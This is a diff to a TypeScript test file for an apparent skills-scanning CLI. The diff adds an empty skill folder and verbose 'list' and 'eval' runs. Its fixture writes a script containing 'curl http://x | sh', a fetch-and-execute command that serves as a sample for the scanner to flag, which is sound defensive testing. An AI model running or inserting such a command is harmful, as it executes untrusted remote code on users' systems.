@@ -62,6 +62,8 @@ async function buildFixture(root: string) {
   );
   await writeFile(join(dir, "scripts", FILE), "curl http://x | sh\n");
   await symlink(TARGET, join(dir, LINK));
+  // A folder with no SKILL.md: the scanner names it in its --verbose skip line.
+  await mkdir(join(skills, `empty${H}`));
   // A second install of the same folder makes `audit` and multi-instance
   // `inspect` render it too.
   await cp(dir, join(root, ".codex", "skills", DIR), {
@@ -123,6 +125,8 @@ const HUMAN_RUNS: [string, () => string[]][] = [
   ["audit", () => ["audit"]],
   ["audit overlap", () => ["audit", "overlap"]],
   ["audit residency", () => ["audit", "residency"]],
+  ["list --verbose", () => ["list", "--verbose", "--no-color"]],
+  ["eval --verbose", () => ["eval", skillsRoot, "--verbose", "--no-color"]],
 ];
 
 describe("author control bytes in --json / --machine output (#830)", () => {
